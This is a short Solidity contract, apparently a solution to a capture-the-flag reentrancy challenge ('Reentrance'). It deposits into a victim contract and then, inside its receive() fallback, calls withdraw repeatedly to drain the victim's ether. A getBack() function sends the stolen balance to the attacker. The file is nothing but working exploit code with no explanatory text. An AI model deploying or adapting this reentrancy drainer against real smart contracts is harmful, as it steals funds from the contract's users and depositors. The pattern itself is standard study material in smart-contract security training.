// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Task.sol';

contract AttackReentrance {

    Reentrance victim;
    address payable owner;
    
    constructor(address payable _victim) {
        victim = Reentrance(_victim);
        owner = payable(msg.sender);
    }

    function donate() public payable {
        victim.donate{value:msg.value}(address(this));
    }

    function attack(uint amount) public {
        victim.withdraw(amount);
    }
  

    function getBack() public {
        require(owner == msg.sender);
        owner.transfer(address(this).balance);
    }

    receive() external payable {
        if (address(victim).balance > 0) {
            victim.withdraw(0.001 ether);
        }
    }

}